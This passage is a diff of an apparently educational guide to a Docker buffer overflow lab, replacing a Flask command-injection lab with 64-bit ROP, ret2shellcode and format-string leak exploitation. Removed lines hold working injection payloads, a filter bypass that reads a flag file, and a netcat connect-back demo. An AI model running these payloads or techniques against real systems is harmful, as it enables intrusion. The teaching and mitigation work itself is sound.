@@ -12,33 +12,31 @@
 3. Environment Setup (Docker)
 4. Part A — Buffer Overflow Theory
 5. Part B — The Buffer Lab (Python Stack Simulator)
-6. Part C — College Pentest Lab (Docker Attack/Defense)
-7. Part D — Interactive Browser Lab
-8. Part E — Vulnerable C Code Analysis
-9. Part F — Mitigations (5 Defense Techniques)
-10. Part G — Bypass: Defeating Weak Mitigations
-11. Part H — Bonus: Buffer Overflow Across Software Types
-12. Part I — Testing & Validation
-13. Part J — Team Roles & Timeline
-14. References & Further Reading
+6. Part C — Modern Pentest Lab (64-bit C Exploitation)
+7. Part D — Mitigations (5 Defense Techniques)
+8. Part E — Bypass: Defeating Protections (ROP & Leaks)
+9. Part F — Bonus: Buffer Overflow Across Software Types
+10. Part G — Testing & Validation
+11. Part H — Team Roles & Timeline
+12. References & Further Reading
 
 ---
 
 ## 1. Project Overview
 
-This project demonstrates a complete security workflow around **Buffer Overflow** vulnerabilities:
+This project demonstrates a complete, modern security workflow around **Stack-Based Buffer Overflow** vulnerabilities. It moves beyond outdated 32-bit Windows tutorials to teach real-world 64-bit Linux exploitation using industry-standard tooling.
 
-- **Attack**: Exploit a vulnerable application to execute arbitrary commands
-- **Defend**: Apply mitigations to prevent the attack
-- **Bypass**: Show that weak mitigations can be circumvented
-- **Analyze**: Study how buffer overflows affect different software categories
+- **Attack**: Exploit a vulnerable C application across three progressive difficulty levels to gain code execution.
+- **Defend**: Apply defense-in-depth mitigations (Canaries, NX, PIE, bounded copies) to prevent the attack.
+- **Bypass**: Show how advanced techniques like Return-Oriented Programming (ROP) and Information Leaks can defeat modern compiler protections.
+- **Analyze**: Study how buffer overflows affect different software categories (Web, Mobile, Desktop, IoT).
 
-The project is fully Docker-based and includes three complementary lab environments:
+The project is fully Docker-based and includes complementary lab environments:
 
 | Lab | Technology | Purpose |
 |---|---|---|
-| **buffer_lab** | Python CLI | Safe stack-frame simulator for understanding memory layout |
-| **college-pentest-lab** | Docker + Flask | Real attack/defense with command injection via buffer-style flaws |
+| **buffer_lab** | Python CLI | Safe stack-frame simulator for understanding basic memory layout |
+| **college-pentest-lab** | Docker + C/Python | Real-world 64-bit Linux exploitation with pwntools and GDB |
 | **interactive_lab** | Browser HTML/JS | Visual byte-level stack simulation |
 
 ---
@@ -47,47 +45,29 @@ The project is fully Docker-based and includes three complementary lab environme
 
 ```
 buffer/
-├── .gitignore
-├── PROJECT_DOCUMENTATION.pdf
-├── PROJECT_DOCUMENTATION_WITH_DEBUGGING.pdf
-│
-├── buffer_lab/                         # Python stack simulator
-│   ├── __init__.py                     # Public API exports
-│   ├── __main__.py                     # CLI entry point
-│   ├── pattern.py                      # De Bruijn cyclic pattern generator
-│   ├── stack_simulator.py              # Stack frame model + unsafe/bounded copy
-│   └── visualizer.py                   # Memory layout diff renderer
-│
-├── college-pentest-lab/                # Docker pentest environment
-│   ├── docker-compose.yml              # 4 services: attacker, victim, safe, bad-safe
-│   ├── docker-compose.debug.yml        # Debug overlay with debugpy ports
+├── buffer_lab/                         # Python stack simulator (Theory)
+├── examples/                           # Interactive browser visualization
+├── college-pentest-lab/                # Main Docker Pentest Environment
+│   ├── docker-compose.yml              # 5 services: attacker, safe, levels 1-3
 │   ├── README.md                       # Lab overview
 │   ├── START_HERE.md                   # Quick-start guide
 │   ├── attacker/
-│   │   ├── Dockerfile                  # Debian + curl, nmap, netcat
-│   │   └── bypass_bad_safe.sh          # Automated bypass demonstration
-│   ├── victim/
-│   │   ├── Dockerfile                  # Python 3.11 + Flask
-│   │   ├── app.py                      # Vulnerable server (shell=True)
-│   │   ├── app_safe.py                 # Remediated server (no shell)
-│   │   ├── app_bad_safe.py             # Weak mitigation (blacklist only)
-│   │   ├── debug_tools.py              # Optional debugpy attachment
-│   │   ├── flag.txt                    # Training flag for capture
-│   │   └── requirements.txt            # Flask + debugpy
-│   └── docs/
-│       └── debugging.md                # IDE debugger attachment guide
-│
-├── examples/
-│   ├── interactive_lab.html            # Browser-based stack visualization
-│   └── vulnerable_demo.c              # Reference C code with strcpy vulnerability
-│
-├── tests/
-│   └── test_buffer_lab.py              # Unit tests for the Python simulator
-│
+│   │   ├── Dockerfile                  # Kali-style image with pwntools, GDB, ROPgadget
+│   │   └── scripts/                    # Exploit scripts
+│   │       ├── 00_recon.py             # Server banner grabbing & checksec
+│   │       ├── 01_fuzzer.py            # Fuzzes TRUN command to find crash
+│   │       ├── 02_find_offset.py       # Cyclic pattern to find RIP offset
+│   │       ├── 03_exploit_level1.py    # ret2shellcode (No protections)
+│   │       ├── 04_exploit_level2.py    # ROP / ret2libc (NX bypass)
+│   │       ├── 05_exploit_level3.py    # Format String Leak + ROP (Full bypass)
+│   │       └── 06_verify_safe.py       # Validates safe_server blocks attacks
+│   └── victim/
+│       ├── Dockerfile                  # Multi-stage C compilation
+│       ├── vuln_server.c               # Vulnerable TCP Server (strcpy & printf)
+│       ├── safe_server.c               # Remediated Server (strncpy & input validation)
+│       └── flag.txt                    # Target file
 ├── tools/
-│   ├── build_docs_pdf.py               # Markdown-to-PDF builder
-│   └── validate_lab.py                 # Lab validation checks
-│
+│   └── build_guide_pdf.py              # Markdown-to-PDF builder
 └── docs/
     └── COMPREHENSIVE_PROJECT_GUIDE.md  # This document
 ```
@@ -101,7 +81,6 @@ buffer/
 - Docker Desktop (Windows/Mac) or Docker Engine (Linux)
 - Docker Compose v2+
 - A terminal (PowerShell, bash, or zsh)
-- Python 3.10+ (for the buffer_lab CLI — optional)
 
 ### Starting the Docker Lab
 
@@ -110,41 +89,23 @@ cd college-pentest-lab
 docker compose up --build -d
 ```
 
-This launches four containers:
+This launches five interconnected containers on an isolated `labnet` bridge network:
 
-| Container | Port | Description |
-|---|---|---|
-| `attacker` | — | Kali-style tools container (curl, nmap, netcat) |
-| `victim` | 8080 | Intentionally vulnerable Flask server |
-| `safe-victim` | 8081 | Properly remediated server |
-| `bad-safe-victim` | 8082 | Weak fix (blacklist-only) — bypassable |
+| Container | Port | Architecture | Description |
+|---|---|---|---|
+| `attacker` | — | x86_64 | Exploit dev environment (pwntools, GDB, pwndbg) |
+| `victim-l1` | 9999 | x86_64 | **Level 1**: No protections (ret2shellcode) |
+| `victim-l2` | 9998 | x86_64 | **Level 2**: NX Enabled (ROP/ret2libc) |
+| `victim-l3` | 9997 | x86_64 | **Level 3**: NX + Canary + PIE (Leak + ROP) |
+| `safe-victim` | 9996 | x86_64 | **Safe**: All protections + safe code |
 
-### Entering the Attacker Container
+### Accessing the Exploit Environment
+
+All attacks should be executed from within the attacker container, which comes pre-configured with necessary tooling:
 
 ```bash
 docker exec -it attacker bash
 ```
-
-### Stopping the Lab
-
-```bash
-docker compose down
-docker compose down --volumes --remove-orphans   # full cleanup
-```
-
-### Debug Mode (Optional)
-
-```bash
-docker compose -f docker-compose.yml -f docker-compose.debug.yml up --build -d
-```
-
-Debug ports (localhost only):
-
-| Service | Port |
-|---|---|
-| victim | 5678 |
-| safe-victim | 5679 |
-| bad-safe-victim | 5680 |
 
 ---
 
@@ -152,706 +113,205 @@ Debug ports (localhost only):
 
 ### What Is a Buffer Overflow?
 
-A **buffer overflow** occurs when a program writes data beyond the boundary of a fixed-size memory buffer, corrupting adjacent memory.
+A **buffer overflow** occurs when a program writes data beyond the boundary of a fixed-size memory buffer, corrupting adjacent memory space.
 
-### Why Is It Dangerous?
+### The Stack Layout (x86_64)
 
-The stack stores critical control data alongside local variables:
+The stack stores critical control data alongside local variables. On a 64-bit architecture, pointers are 8 bytes long.
 
 ```
 +---------------------------+  Higher Addresses
 |      Function Arguments   |
 +---------------------------+
-|      Return Address       |  <-- TARGET: controls where execution continues
+|      Return Address (RIP) |  <-- TARGET: 8 bytes. Controls execution flow
 +---------------------------+
-|      Saved Frame Pointer  |  <-- EBP: points to the caller's stack frame
+|      Saved RBP            |  <-- 8 bytes. Base pointer of caller
 +---------------------------+
-|      [Stack Canary]       |  <-- Optional: corruption detector
+|      [Stack Canary]       |  <-- Optional: 8 byte corruption detector
 +---------------------------+
-|      Local Buffer         |  <-- Our input goes here
+|      Local Buffer         |  <-- 128 bytes. Our input goes here
 +---------------------------+  Lower Addresses (stack grows down)
 ```
 
-When an attacker overflows the local buffer, they can overwrite the **return address** and redirect execution to arbitrary code.
+When an attacker writes more than 128 bytes into the local buffer, they overwrite the saved RBP and the Return Address (RIP). When the function executes the `ret` instruction, the CPU pops the attacker's value off the stack into the instruction pointer, hijacking the program.
 
 ### The Dangerous C Functions
 
 | Dangerous | Safe Alternative | Problem |
 |---|---|---|
-| `strcpy()` | `strncpy()` | No length check |
-| `gets()` | `fgets()` | No length check |
-| `sprintf()` | `snprintf()` | No length check |
-| `strcat()` | `strncat()` | No length check |
-| `scanf("%s")` | `scanf("%63s")` | No width limit |
-
-### Types of Buffer Overflow
-
-1. **Stack-based** — overwrite return address on the stack (most common, this project's focus)
-2. **Heap-based** — corrupt dynamic memory metadata
-3. **Integer overflow** — arithmetic error leads to undersized allocation
-4. **Off-by-one** — single byte past the boundary corrupts the saved frame pointer
-5. **Format string** — related class: `printf(user_input)` leaks or writes memory
+| `strcpy()` | `strncpy()` | Copies until `\0` with no length check |
+| `gets()` | `fgets()` | Reads until newline with no length check |
+| `sprintf()` | `snprintf()` | Formats string with no length check |
+| `printf(input)` | `printf("%s", input)` | Format String Vulnerability |
 
 ---
 
 ## 5. Part B — The Buffer Lab (Python Stack Simulator)
 
-The `buffer_lab` package is a safe, pure-Python simulator that models stack memory without executing any attacker-controlled bytes. It is the recommended way to learn offset calculation and canary behavior.
-
-### Installation
-
-No installation needed — it runs directly:
+Before jumping into GDB and x86_64 assembly, students can use the `buffer_lab` package. It is a safe, pure-Python simulator that models stack memory.
 
 ```bash
-python -m buffer_lab --help
-```
+# Generate a cyclic pattern to find offsets
+python -m buffer_lab pattern --length 150
 
-### Available Commands
-
-#### Generate a Cyclic Pattern
-
-```bash
-python -m buffer_lab pattern --length 128
-```
-
-Output: a de Bruijn sequence where every 4-byte window is unique. This is used to find the exact offset of the return address after a crash.
-
-#### Find an Offset
-
-```bash
-python -m buffer_lab find-offset --needle 0x61616174 --length 128
-```
-
-If a debugger shows EIP = `0x61616174` after a crash, this command returns the exact byte offset (e.g., `52`).
-
-#### Simulate an Unsafe Copy (Overflow)
-
-```bash
-python -m buffer_lab demo-overflow --buffer-size 64 --payload-size 80
-```
-
-Output shows whether the payload stayed inside the buffer, overflowed metadata, or replaced the return address.
-
-#### Simulate with Stack Canary
-
-```bash
-python -m buffer_lab demo-overflow --buffer-size 64 --payload-size 80 --canary
-```
-
-With canary enabled, the simulator detects corruption and reports `ABORTED`.
-
-#### Show Stack Layout Diff
-
-```bash
-python -m buffer_lab show-layout --buffer-size 64 --payload-size 80 --marker HACK
-```
-
-Renders a before/after view of the entire stack frame, showing which fields were overwritten.
-
-#### Simulate a Bounded (Safe) Copy
-
-```bash
-python -m buffer_lab safe-copy --buffer-size 64 --payload-size 80
-```
-
-The bounded copy rejects oversized input, demonstrating the safe alternative.
-
-### Source Code Architecture
-
-#### `pattern.py` — Cyclic Pattern Generator
-
-Uses a de Bruijn sequence algorithm to create patterns where every N-byte window is unique:
-
-```python
-def cyclic(length, *, alphabet=DEFAULT_ALPHABET, window=4):
-    """Return a deterministic cyclic pattern with unique 4-byte windows."""
-    sequence = _de_bruijn(alphabet, window)
-    repeats = (length // len(sequence)) + 1
-    return (sequence * repeats)[:length]
-
-def find_offset(needle, *, length=8192):
-    """Find a byte sequence inside a cyclic pattern.
-    Hex integer needles are interpreted as little-endian."""
-    pattern = cyclic(length)
-    return pattern.find(_needle_to_bytes(needle))
-```
-
-#### `stack_simulator.py` — Stack Frame Model
-
-Models a real stack frame with buffer, optional canary, saved frame pointer, and return address:
-
-```python
-class StackFrame:
-    def unsafe_copy(self, payload, *, control_marker=b"BBBB"):
-        """Copy bytes as an unsafe C string function would."""
-        self.reset()
-        for index, value in enumerate(payload):
-            if index >= len(self._memory):
-                break
-            self._memory[index] = value
-        # Check canary integrity, overflow status, etc.
-
-    def bounded_copy(self, payload):
-        """Reject input that would not fit in the fixed buffer."""
-        if len(payload) > self.buffer_size:
-            raise UnsafeCopyError(...)
-        return self.unsafe_copy(payload)
-```
-
-#### `visualizer.py` — Layout Renderer
-
-Creates a human-readable diff of stack memory before and after a copy:
-
-```
-OVERWRITE: return address replaced with marker
-payload_size=72
-buffer_size=64
-canary_enabled=False
-canary_ok=True
-
-offset       field                  size  status       before -> after
------------  ---------------------  ----  -----------  ----------------
-0000-0063    buffer                   64  written      00 00 00 ... -> 41 41 41 ...
-0064-0067    saved_frame_pointer       4  overwritten  45 42 50 21 |EBP!| -> 41 41 41 41 |AAAA|
-0068-0071    return_address            4  marker       52 45 54 30 |RET0| -> 42 42 42 42 |BBBB|
-```
-
----
-
-## 6. Part C — College Pentest Lab (Docker Attack/Defense)
-
-This is the hands-on Docker lab where students perform real attacks against a vulnerable web application.
-
-### Architecture
-
-```
-                    Docker Network (labnet)
-                    ┌──────────────────────────┐
-                    │                          │
-  ┌─────────┐      │  ┌──────────┐            │
-  │ attacker │──────┼─>│  victim  │ port 8080  │
-  │ (tools)  │      │  │ (vuln)   │            │
-  └─────────┘      │  └──────────┘            │
-       │            │                          │
-       │            │  ┌──────────────┐        │
-       └────────────┼─>│ safe-victim  │ :8081  │
-                    │  │ (remediated) │        │
-                    │  └──────────────┘        │
-                    │                          │
-                    │  ┌────────────────┐      │
-                    └─>│ bad-safe-victim│ :8082│
-                       │ (weak fix)    │      │
-                       └────────────────┘      │
-                    └──────────────────────────┘
-```
-
-### The Vulnerable Server (`app.py`)
-
-The vulnerable endpoint concatenates user input directly into a shell command:
-
-```python
-@app.get("/ping")
-def ping():
-    host = request.args.get("host", "")
-    cmd = f"ping -c 1 {host}"
-    output = subprocess.check_output(cmd, shell=True, ...)
-```
-
-**The vulnerability**: `shell=True` + unsanitized input = **Command Injection**
-
-### Attack Walkthrough
-
-From the attacker container:
-
-**Step 1: Reconnaissance**
-```bash
-curl http://victim:8080/
-curl http://victim:8080/health
-```
-
-**Step 2: Normal ping**
-```bash
-curl "http://victim:8080/ping?host=127.0.0.1"
-```
-
-**Step 3: Command injection**
-```bash
-curl "http://victim:8080/ping?host=127.0.0.1;whoami"
-```
-
-The semicolon makes the shell execute `ping -c 1 127.0.0.1` AND THEN `whoami`.
-
-**Step 4: Escalate — read files**
-```bash
-curl "http://victim:8080/ping?host=127.0.0.1;cat%20flag.txt"
-```
-
-**Step 5: Explore the system**
-```bash
-curl "http://victim:8080/ping?host=127.0.0.1;ls"
-curl "http://victim:8080/ping?host=127.0.0.1;pwd"
-curl "http://victim:8080/ping?host=127.0.0.1;id"
-```
-
-### Connect-Back Demo
-
-The victim server includes a simulated callback endpoint that demonstrates the network direction of a reverse shell:
-
-```bash
-# Start listener on attacker:
-nc -lp 4444
-
-# Trigger callback from victim:
-curl "http://victim:8080/callback-demo?host=attacker&port=4444"
-```
-
----
-
-## 7. Part D — Interactive Browser Lab
-
-Open `examples/interactive_lab.html` in any browser. This provides a visual, interactive simulation:
-
-### Features
-
-- **Payload size slider**: adjust how many bytes to write
-- **Buffer size control**: change the buffer allocation
-- **Copy mode toggle**: switch between unsafe (overflow allowed) and bounded (safe) copy
-- **Stack canary toggle**: enable/disable canary protection
-- **Return marker**: set a 4-byte marker to place at the return address
-- **Visual stack frame**: color-coded segments (buffer, canary, frame pointer, return address)
-- **Byte grid**: individual byte view showing which bytes changed
-
-### Color Coding
-
-| Color | Segment |
-|---|---|
-| Blue | Buffer |
-| Yellow | Stack Canary |
-| Green | Saved Frame Pointer |
-| Red | Return Address |
-
-### Status Messages
-
-- **OK**: payload stayed inside the buffer
-- **OVERFLOW**: adjacent stack metadata changed
-- **OVERWRITE**: return address replaced with marker
-- **ABORTED**: stack canary detected corruption
-- **REJECTED**: bounded copy refused oversized input
-
----
-
-## 8. Part E — Vulnerable C Code Analysis
-
-The file `examples/vulnerable_demo.c` contains a minimal C program with a classic buffer overflow:
-
-```c
-#include <stdio.h>
-#include <string.h>
-
-void vulnerable_copy(const char *input) {
-    char buffer[64];
-    strcpy(buffer, input);           // No bounds checking!
-    printf("copied: %.64s\n", buffer);
-}
-
-int main(int argc, char **argv) {
-    if (argc != 2) {
-        fprintf(stderr, "usage: %s <input>\n", argv[0]);
-        return 1;
-    }
-    vulnerable_copy(argv[1]);
-    return 0;
-}
-```
-
-### What Happens
-
-1. `buffer` is allocated 64 bytes on the stack
-2. `strcpy` copies the entire input regardless of length
-3. If input > 64 bytes, it overwrites the saved frame pointer and return address
-4. At function return, the CPU jumps to the attacker-controlled address
-
-### How to Compile (on a Linux system)
-
-```bash
-# Compile WITHOUT protections (for testing):
-gcc -o vuln vulnerable_demo.c -fno-stack-protector -z execstack -no-pie -m32
-
-# Compile WITH protections (safe):
-gcc -o vuln_safe vulnerable_demo.c -fstack-protector-all -D_FORTIFY_SOURCE=2
-```
-
----
-
-## 9. Part F — Mitigations (5 Defense Techniques)
-
-### 1. Stack Canaries
-
-**How it works**: The compiler inserts a random value (canary) between the buffer and the return address. Before the function returns, it checks if the canary was modified.
-
-```
-Stack with Canary:
-+------------------+
-| Return Address   |
-+------------------+
-| Saved EBP        |
-+------------------+
-| CANARY VALUE     |  <-- If modified = ABORT
-+------------------+
-| buffer[64]       |
-+------------------+
-```
-
-**Compile flags**:
-- Enable: `gcc -fstack-protector-all`
-- Disable: `gcc -fno-stack-protector`
-
-**Demonstration**: Use the Python simulator:
-```bash
+# Test how a canary works
 python -m buffer_lab demo-overflow --buffer-size 64 --payload-size 80 --canary
 # Output: ABORTED: stack canary detected corruption
 ```
 
-### 2. DEP / NX Bit (Data Execution Prevention)
+---
 
-**How it works**: Marks memory pages as either writable OR executable, never both. The stack is writable but not executable, so shellcode placed there cannot run.
+## 6. Part C — Modern Pentest Lab (64-bit C Exploitation)
 
-**Compile flags**:
-- Enable: `gcc -z noexecstack` (default on modern systems)
-- Disable: `gcc -z execstack`
+The core of this project is a custom TCP server (`vuln_server.c`) written in C. It exposes two commands:
+- `TRUN <data>`: Vulnerable to a classic `strcpy` buffer overflow.
+- `INFO <data>`: Vulnerable to a `printf` format string information leak (Level 3 only).
 
-### 3. ASLR (Address Space Layout Randomization)
+### Exploitation Workflow
 
-**How it works**: The OS loads the stack, heap, and shared libraries at random addresses each time a program runs. Attackers cannot hardcode addresses.
+All scripts are located in `attacker/scripts/`.
 
-**System control**:
+#### Step 1: Reconnaissance
+The attacker maps the network and checks binary protections using `checksec`.
 ```bash
-# Check current level:
-cat /proc/sys/kernel/randomize_va_space
-
-# Levels:
-# 0 = Off
-# 1 = Stack + Libraries randomized
-# 2 = Stack + Libraries + Heap randomized (Full)
-
-# Disable (for testing only):
-echo 0 > /proc/sys/kernel/randomize_va_space
+python3 scripts/00_recon.py
 ```
 
-### 4. PIE (Position Independent Executable)
-
-**How it works**: Even the program's own code is loaded at a random base address. Without PIE, the code segment starts at a fixed address (e.g., `0x08048000` on x86).
-
-**Compile flags**:
-- Enable: `gcc -pie -fpie`
-- Disable: `gcc -no-pie`
-
-### 5. RELRO (Relocation Read-Only)
-
-**How it works**: Protects the Global Offset Table (GOT) from being overwritten. The GOT contains addresses of library functions — if an attacker overwrites a GOT entry, they can redirect function calls.
-
-**Compile flags**:
-- Partial: `gcc -Wl,-z,relro`
-- Full: `gcc -Wl,-z,relro,-z,now`
-
-### Checking Protections with checksec
-
+#### Step 2: Fuzzing
+The attacker sends increasingly large payloads to `TRUN` until the server stops responding, identifying the approximate size of the buffer.
 ```bash
-checksec --file=./vuln_server
-
-# Example output:
-# RELRO:     No RELRO
-# Stack:     No canary found
-# NX:        NX disabled
-# PIE:       No PIE
+python3 scripts/01_fuzzer.py victim-l1 9999
 ```
 
-### Safe Server Mitigations (app_safe.py)
+#### Step 3: Finding the Offset
+Using a de Bruijn sequence (cyclic pattern), the attacker determines the exact byte offset required to overwrite the Return Address (RIP). In our lab, the buffer is 128 bytes + 8 bytes (RBP) = **136 bytes to RIP**.
+```bash
+python3 scripts/02_find_offset.py victim-l1 9999
+```
 
-The safe server in the Docker lab applies these software-level mitigations:
-
-1. **Input validation**: Host must be a valid IP address or DNS hostname
-2. **No shell execution**: Uses argument list instead of `shell=True`
-3. **Output escaping**: HTML-escapes all command output
-4. **Container hardening**: Runs as non-root with read-only filesystem
-5. **Principle of least privilege**: `no-new-privileges` security option
-
-```python
-# SAFE: validates input, no shell, argument list
-if not is_valid_host(host):
-    return "Invalid host", 400
-
-subprocess.check_output(
-    ["ping", "-c", "1", host],    # No shell=True!
-    stderr=subprocess.STDOUT,
-    timeout=3,
-)
+#### Step 4: Level 1 Exploit (ret2shellcode)
+Level 1 is compiled with **no protections** (`-fno-stack-protector -z execstack -no-pie`).
+- **Technique**: Inject x86_64 `execve("/bin/sh")` shellcode directly onto the stack.
+- **Execution**: Overwrite RIP with the stack's address to jump to the shellcode.
+```bash
+python3 scripts/03_exploit_level1.py
 ```
 
 ---
 
-## 10. Part G — Bypass: Defeating Weak Mitigations
+## 7. Part D — Mitigations (5 Defense Techniques)
 
-### The Bad Safe Server (`app_bad_safe.py`)
+To secure the server, `safe_server.c` implements defense-in-depth, combining software-level fixes with compiler protections.
 
-A developer noticed the `;whoami` attack and added a blacklist that blocks only the semicolon character:
+### 1. Code-Level Fixes
+- Replaced `strcpy` with bounded `strncpy`.
+- Enforced strict length validation *before* copying data.
+- Fixed the format string vulnerability by forcing `snprintf(buf, size, "%s", input)`.
 
-```python
-BLOCKED_TOKENS = [";"]
-
-def weak_filter_allows(host):
-    return not any(token in host for token in BLOCKED_TOKENS)
-
-# Still uses shell=True!
-cmd = f"ping -c 1 {host}"
-subprocess.check_output(cmd, shell=True, ...)
-```
-
-### Why the Fix Fails
-
-The fix blocks `;` but the shell has many other operators:
-
-| Operator | Syntax | Blocked? |
+### 2. Compiler Protections
+| Protection | Compile Flag | How it Works |
 |---|---|---|
-| Semicolon | `; command` | Yes (blocked) |
-| Command substitution | `$(command)` | **No — bypasses!** |
-| Backtick substitution | `` `command` `` | **No — bypasses!** |
-| Pipe | `\| command` | **No — bypasses!** |
-| AND | `&& command` | **No — bypasses!** |
-| OR | `\|\| command` | **No — bypasses!** |
+| **NX / DEP** | `-z noexecstack` | Marks the stack as non-executable. Stops `ret2shellcode`. |
+| **Stack Canary** | `-fstack-protector-all` | Places a random 8-byte value before the return address. Checked upon `ret`. |
+| **PIE / ASLR** | `-pie -fPIE` | Randomizes the base addresses of the binary and libraries in memory. |
+| **Full RELRO** | `-Wl,-z,relro,-z,now` | Makes the Global Offset Table (GOT) read-only, preventing function hook hijacks. |
+| **FORTIFY_SOURCE** | `-D_FORTIFY_SOURCE=2` | Replaces unsafe standard library calls with bounded versions at compile time. |
 
-### Bypass Demonstration
-
-From the attacker container:
-
+**Verification**:
 ```bash
-# Step 1: Original attack is blocked
-curl "http://bad-safe-victim:8080/ping?host=127.0.0.1%3Bwhoami&format=text"
-# Result: 400 Blocked
-
-# Step 2: Command substitution bypasses the filter!
-curl "http://bad-safe-victim:8080/ping?host=127.0.0.1%24%28whoami%29&format=text"
-# Result: ping error reveals the output of whoami
-
-# Step 3: Read the flag
-curl "http://bad-safe-victim:8080/ping?host=127.0.0.1%24%28cat%20flag.txt%29&format=text"
-# Result: flag content revealed!
-
-# Step 4: Compare with the truly safe server
-curl "http://safe-victim:8080/ping?host=127.0.0.1%24%28whoami%29"
-# Result: 400 Invalid host — properly rejected
+python3 scripts/06_verify_safe.py
+# Result: All exploitation attempts are blocked.
 ```
-
-Or use the automated script:
-```bash
-docker exec -it attacker bash
-bypass-bad-safe
-```
-
-### Lesson: Blacklists Are Not a Real Fix
-
-The correct approach is:
-1. **Never use `shell=True`** with user input
-2. **Validate input type** (is it really an IP/hostname?)
-3. **Use argument lists** so the OS treats input as data, not commands
 
 ---
 
-## 11. Part H — Bonus: Buffer Overflow Across Software Types
+## 8. Part E — Bypass: Defeating Protections (ROP & Leaks)
+
+Modern exploitation rarely relies on executing shellcode on the stack due to NX/DEP. The project demonstrates how advanced techniques bypass these mitigations.
+
+### Level 2: Bypassing NX via ROP (Return-Oriented Programming)
+Level 2 enables NX, meaning the stack is no longer executable.
+- **The Bypass**: Instead of injecting code, we string together existing snippets of executable code in the binary (called "gadgets").
+- **Technique**: We find a `pop rdi; ret` gadget, load the address of the string `"/bin/sh"` into the `RDI` register, and return into the `system()` function located in libc.
+```bash
+python3 scripts/04_exploit_level2.py
+```
+
+### Level 3: Bypassing Canaries and PIE via Info Leaks
+Level 3 enables Canaries and PIE. We cannot guess the Canary, nor do we know where the ROP gadgets are located in memory.
+- **The Bypass**: We exploit a separate vulnerability (Format String in the `INFO` command) to leak memory contents before we overflow the buffer.
+- **Technique**:
+  1. Send `%p.%p.%p...` to read values off the stack.
+  2. Parse the leaked Stack Canary to place it correctly in our overflow payload, keeping the server from aborting.
+  3. Parse leaked addresses to dynamically calculate the randomized PIE and Libc base addresses.
+  4. Construct the ROP chain dynamically on the fly.
+```bash
+python3 scripts/05_exploit_level3.py
+```
+
+---
+
+## 9. Part F — Bonus: Buffer Overflow Across Software Types
 
 ### Web Applications
-
-**How buffer overflow affects web software:**
-
-- Web servers written in C/C++ (Apache modules, Nginx modules, OpenSSL)
-- CGI scripts in native languages
-- Memory-unsafe libraries used by web frameworks
-
-**Famous example: Heartbleed (CVE-2014-0160)**
-
-A buffer over-read in OpenSSL's heartbeat extension:
-- Client sends a heartbeat with a claimed length larger than the actual payload
-- Server copies that many bytes from memory and sends them back
-- The extra bytes come from server memory — potentially containing passwords, private keys, and session cookies
-
-**Mitigations for web:**
-- Use memory-safe languages (Python, Java, Go, Rust) for application logic
-- Keep native libraries (OpenSSL, libxml2) updated
-- Deploy Web Application Firewalls (WAF)
-- Input validation at every layer
+**How it affects web:**
+- Web servers (Apache, Nginx) and frameworks often rely on underlying C/C++ libraries (e.g., OpenSSL, libxml2, image parsers).
+- **Example:** Heartbleed (CVE-2014-0160) was a buffer over-read in OpenSSL that allowed attackers to leak memory, exposing passwords and private keys from web servers.
 
 ### Mobile Applications
-
-**How buffer overflow affects mobile software:**
-
-- Android: Java/Kotlin code is safe, but **JNI (Java Native Interface)** calls into C/C++ are vulnerable
-- iOS: Swift is safe, but Objective-C and C libraries can overflow
-
-**Example: Android JNI vulnerability**
-
-```c
-JNIEXPORT void JNICALL Java_com_app_Native_processInput(
-    JNIEnv *env, jobject obj, jstring input) {
-
-    const char *native = (*env)->GetStringUTFChars(env, input, 0);
-    char buffer[128];
-    strcpy(buffer, native);  // Buffer Overflow in native code!
-}
-```
-
-**Mitigations for mobile:**
-- Android enables ASLR and DEP by default since Android 4.1
-- NDK compiler includes stack canaries by default
-- Prefer Java/Kotlin over native code
-- iOS: ARM architecture protections + App Sandbox
+**How it affects mobile:**
+- Android apps are mostly written in memory-safe Java/Kotlin, but heavily rely on the **Java Native Interface (JNI)** for performance. Vulnerabilities in these C/C++ JNI libraries can lead to remote code execution on the device.
+- iOS apps utilizing legacy Objective-C or C libraries face similar risks.
 
 ### Desktop Applications
-
-**How buffer overflow affects desktop software:**
-
-- PDF readers (Adobe Reader), media players (VLC), browsers, office suites
-- Opening a malformed file triggers overflow in the parsing code
-- Result: Remote Code Execution — opening a file = full system compromise
-
-**Famous examples:**
-- Adobe Reader: malformed PDF → buffer overflow → RCE
-- VLC: crafted video file → heap overflow → code execution
-- Internet Explorer: JavaScript heap spray → arbitrary code execution
-
-**Mitigations for desktop:**
-- Windows: DEP + ASLR + CFG (Control Flow Guard) enabled by default
-- Linux: ASLR + NX + Stack Canaries
-- Application sandboxing (Chrome, Adobe sandbox)
-- Automatic security updates
+**How it affects desktop:**
+- Document parsers (PDF readers, Office suites) and media players are historically prime targets.
+- **Example:** Opening a malformed PDF file triggers an overflow in Adobe Reader's parsing engine, executing the embedded payload and compromising the user's PC simply by opening a document.
 
 ### IoT / Embedded Systems
-
-**How buffer overflow affects IoT:**
-
-- Devices use weak processors (MIPS, ARM) running C firmware
-- Often compiled without ANY protections — no ASLR, no DEP, no canaries
-- Firmware rarely updated
-- Network-facing services with no input validation
-
-**Famous examples:**
-- **Mirai Botnet**: exploited default credentials + buffer overflows in IoT devices to build a massive DDoS botnet
-- **Router vulnerabilities**: full control of home routers via overflow in web admin interface
-- **IP cameras**: video feed access + remote code execution
-
-**Mitigations for IoT:**
-- Firmware updates (the biggest challenge — many devices never get updates)
-- Network segmentation (isolate IoT on a separate VLAN)
-- Strong default credentials
-- Compile firmware with ASLR/DEP/canaries enabled
-
-### Comparison Summary
-
-| Platform | Primary Language | BOF Possible? | Protection Level |
-|---|---|---|---|
-| Web Servers | C (server core) + managed | Yes (in native code) | High |
-| Mobile | Java/Kotlin + C (JNI) | Yes (in JNI only) | High |
-| Desktop | C/C++ | Yes (very common) | Medium-High |
-| IoT/Embedded | C | Yes (most vulnerable) | Very Low |
+**How it affects IoT:**
+- IoT devices (routers, IP cameras) run on limited hardware with minimal OS protections (often lacking ASLR, DEP, and Canaries).
+- Their firmware is written in C and rarely updated, making them the most vulnerable software category today.
+- **Example:** The Mirai Botnet compromised millions of IoT devices via simple buffer overflows and default credentials to launch massive DDoS attacks.
 
 ---
 
-## 12. Part I — Testing & Validation
+## 10. Part G — Testing & Validation
 
-### Unit Tests
+The lab is validated directly via exploitation. The success criteria for the project is obtaining arbitrary command execution (a shell) on the vulnerable containers, and proving the safe container cannot be breached.
 
-The project includes a test suite for the Python simulator:
-
-```bash
-python -m pytest tests/test_buffer_lab.py -v
-```
-
-**Test cases:**
-
-1. **Pattern offset (bytes)**: verifies that `find_offset` correctly locates a 4-byte sequence
